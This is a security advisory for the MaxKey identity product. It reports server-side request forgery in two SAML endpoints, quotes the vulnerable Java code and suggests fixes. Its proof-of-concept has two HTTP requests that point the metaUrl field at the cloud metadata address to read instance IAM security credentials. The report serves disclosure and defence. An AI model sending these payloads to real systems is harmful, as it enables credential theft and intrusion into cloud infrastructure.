There are SSRF vulnerabilities in two APIs of MaxKey project

# Vulnerability Description

The open source industry-leading IAM-IDaas identity management and authentication product https://gitee.com/dromara/MaxKey has multiple SSRF vulnerabilities.

- Vulnerability Discloser: [Honor Cyber Security Lab](https://github.com/honorseclab)
- Vendors: [https://www.maxkey.top/](https://www.maxkey.top/)
- Source code address：[https://gitee.com/dromara/MaxKey](https://gitee.com/dromara/MaxKey)
- [https://gitee.com/dromara/MaxKey/issues/ICDR3E](https://gitee.com/dromara/MaxKey/issues/ICDR3E)

Note: **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

[maxkey-webs\maxkey-web-mgt\src\main\java\org\dromara\maxkey\web\apps\contorller\SAML20DetailsController.java](https://gitee.com/dromara/MaxKey/blob/main/maxkey-webs/maxkey-web-mgt/src/main/java/org/dromara/maxkey/web/apps/contorller/SAML20DetailsController.java)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
// maxkey-webs\maxkey-web-mgt\src\main\java\org\dromara\maxkey\web\apps\contorller\SAML20DetailsController.java:add
    @ResponseBody
    @RequestMapping(value={"/add"}, produces = {MediaType.APPLICATION_JSON_VALUE})
    public Message<?> add(
            @RequestBody AppsSAML20Details saml20Details,
            @CurrentUser UserInfo currentUser) {
        logger.debug("-Add  : {}" , saml20Details);
        try {
            transform(saml20Details);  //📌📌📌📌📌📌
        } catch (Exception e) {
            e.printStackTrace();
        }
        saml20Details.setInstId(currentUser.getInstId());
        saml20DetailsService.insert(saml20Details);
        if (appsService.insertApp(saml20Details)) {
            return new Message<AppsSAML20Details>(Message.SUCCESS);
        } else {
            return new Message<AppsSAML20Details>(Message.FAIL);
        }
    }

// maxkey-webs\maxkey-web-mgt\src\main\java\org\dromara\maxkey\web\apps\contorller\SAML20DetailsController.java:transform
    protected AppsSAML20Details transform(AppsSAML20Details samlDetails) throws Exception{
        super.transform(samlDetails);
        ByteArrayInputStream bArrayInputStream = null;
        if(StringUtils.isNotBlank(samlDetails.getMetaFileId())) {
            bArrayInputStream = new ByteArrayInputStream(
                    fileUploadService.get(samlDetails.getMetaFileId()).getUploaded());
            fileUploadService.delete(samlDetails.getMetaFileId());
        }
        if(StringUtils.isNotBlank(samlDetails.getFileType())){
            if(samlDetails.getFileType().equals("certificate")){//certificate file
                try {
                    if(bArrayInputStream != null) {
                        samlDetails.setTrustCert(
                                X509CertUtils.loadCertFromInputStream(bArrayInputStream));
                    }
                } catch (IOException e) {
                    logger.error("read certificate file error .", e);
                }
            }else if(samlDetails.getFileType().equals("metadata_file")){//metadata file
                if(bArrayInputStream != null) {
                    samlDetails = resolveMetaData(samlDetails,bArrayInputStream);
                }
            }else if(samlDetails.getFileType().equals("metadata_url")
                    &&StringUtils.isNotBlank(samlDetails.getMetaUrl())){//metadata url
                CloseableHttpClient httpClient = HttpClients.createDefault();
                HttpPost post = new HttpPost(samlDetails.getMetaUrl());  //📌📌📌📌📌📌
                CloseableHttpResponse response = httpClient.execute(post);   //📌📌📌📌📌📌
                samlDetails = resolveMetaData(samlDetails,response.getEntity().getContent());;
                response.close();
                httpClient.close();
            }
        } 
        ……
    }
```

It can be seen that the external API with the route "/add" receives the URL parameter "samlDetails.getMetaUrl()" passed externally, and directly initiates an http request to the target URL through "httpClient.execute(post)" without any verification and filtering, which constitutes a typical SSRF vulnerability.

A similar SSRF vulnerability is also located in another API interface of this Controller:

```java
// maxkey-webs\maxkey-web-mgt\src\main\java\org\dromara\maxkey\web\apps\contorller\SAML20DetailsController.java:update
    @ResponseBody
    @RequestMapping(value={"/update"}, produces = {MediaType.APPLICATION_JSON_VALUE})
    public Message<?> update(
            @RequestBody AppsSAML20Details saml20Details,
            @CurrentUser UserInfo currentUser) {
        logger.debug("-update  : {}" , saml20Details);
        try {
            transform(saml20Details);  //📌📌📌📌📌📌
        } catch (Exception e) {
            e.printStackTrace();
        }
        saml20Details.setInstId(currentUser.getInstId());
        saml20DetailsService.update(saml20Details);
        if (appsService.updateApp(saml20Details)) {
            return new Message<AppsSAML20Details>(Message.SUCCESS);
        } else {
            return new Message<AppsSAML20Details>(Message.FAIL);
        }
    }

// maxkey-webs\maxkey-web-mgt\src\main\java\org\dromara\maxkey\web\apps\contorller\SAML20DetailsController.java:transform
    protected AppsSAML20Details transform(AppsSAML20Details samlDetails) throws Exception{
        super.transform(samlDetails);
        ByteArrayInputStream bArrayInputStream = null;
        if(StringUtils.isNotBlank(samlDetails.getMetaFileId())) {
            bArrayInputStream = new ByteArrayInputStream(
                    fileUploadService.get(samlDetails.getMetaFileId()).getUploaded());
            fileUploadService.delete(samlDetails.getMetaFileId());
        }

        if(StringUtils.isNotBlank(samlDetails.getFileType())){
            if(samlDetails.getFileType().equals("certificate")){//certificate file
                try {
                    if(bArrayInputStream != null) {
                        samlDetails.setTrustCert(
                                X509CertUtils.loadCertFromInputStream(bArrayInputStream));
                    }
                } catch (IOException e) {
                    logger.error("read certificate file error .", e);
                }
            }else if(samlDetails.getFileType().equals("metadata_file")){//metadata file
                if(bArrayInputStream != null) {
                    samlDetails = resolveMetaData(samlDetails,bArrayInputStream);
                }
            }else if(samlDetails.getFileType().equals("metadata_url")
                    &&StringUtils.isNotBlank(samlDetails.getMetaUrl())){//metadata url
                CloseableHttpClient httpClient = HttpClients.createDefault();
                HttpPost post = new HttpPost(samlDetails.getMetaUrl());  //📌📌📌📌📌📌
                CloseableHttpResponse response = httpClient.execute(post);  //📌📌📌📌📌📌
                samlDetails = resolveMetaData(samlDetails,response.getEntity().getContent());;
                response.close();
                httpClient.close();
            }
        }
        ……
    }
```

SSRF (Server-Side Request Forgery) vulnerabilities can allow attackers to access internal systems, services, or sensitive data by exploiting the server's ability to make unauthorized external requests, potentially leading to information disclosure, unauthorized access, or further exploitation within the network.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file.

The vulnerability proof of concept (POC) is as follows:

```js
POST /apps/saml20/add HTTP/1.1
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "fileType": "metadata_url",
  "metaUrl": "http://169.254.169.254/latest/meta-data",
  "entityId": "attacker",
  "metaFileId": "",
  "instId": "default"
}

POST /apps/saml20/update HTTP/1.1
Host: target.com
Authorization: Bearer [valid_jwt]
Content-Type: application/json

{
  "fileType": "metadata_url",
  "metaUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

# Security Suggestions

To fix SSRF (Server-Side Request Forgery) vulnerabilities, validate and sanitize all user-supplied input used in HTTP requests, restrict server access to trusted internal resources by implementing proper whitelisting or IP filtering, use secure coding practices to prevent unintended outbound requests, and consider proxying external requests through a controlled intermediary with appropriate access controls.
